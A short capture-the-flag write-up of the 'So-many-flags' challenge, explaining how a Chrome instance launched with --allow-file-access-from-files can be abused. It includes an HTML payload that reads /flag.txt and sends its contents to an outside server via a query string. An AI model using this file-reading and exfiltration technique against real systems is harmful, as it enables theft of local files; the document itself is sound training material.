# So-many-flags Writeup from L.A.R.S.

## Setup

As always, for the local setup we run the docker container:
```bash
docker build -t so-many-flags . && docker run -p 1337:1337 -t so-many-flags
```

And for remote we use the suggested command:
```bash
ncat --ssl so-many-flags.ctf.kitctf.de 443
```
This gives us an instance for 29 minutes -- that should do!


## Looking around

### Dockerfile

From the `Dockerfile` we can learn that chrome is installed (together with some fonts) and a node server (using `package.json` and `server.js`) is started up.
The flag seems to be stored in `/flag.txt`.

### server.js

From the `server.js` we can learn that there's an upload interface for files that are stored as some random name ending in `.html`. After uploading chrome is started with all the flags from `flags.txt`, opening the file we uploaded.
After some time it's killed again.

### flags.txt

In `flags.txt` we do indeed seem to find all the flags available. Notably that also includes the flag `--allow-file-access-from-files`.

## Exploiting

### Just upload it!

Due to the `--allow-file-access-from-file` flag, we *should* be able to make the launched chrome browser open the flag and send it to some endpoint, where we can receive it.

That's quite straight forward:
```html
<html>
    <script>
        fetch("/flag.txt")
            .then((res) => res.text())
            .then((text) => fetch(`https://<some-url-where-we-can-view-access-logs>?data=${text}`))
    </script>
</html>
```

And indeed, uploading this as file, we receive the `GPNCTF{fake_flag}` in our webserver from the local instance.
If we then upload it to the remote server, we do get the flag. **Yay!**
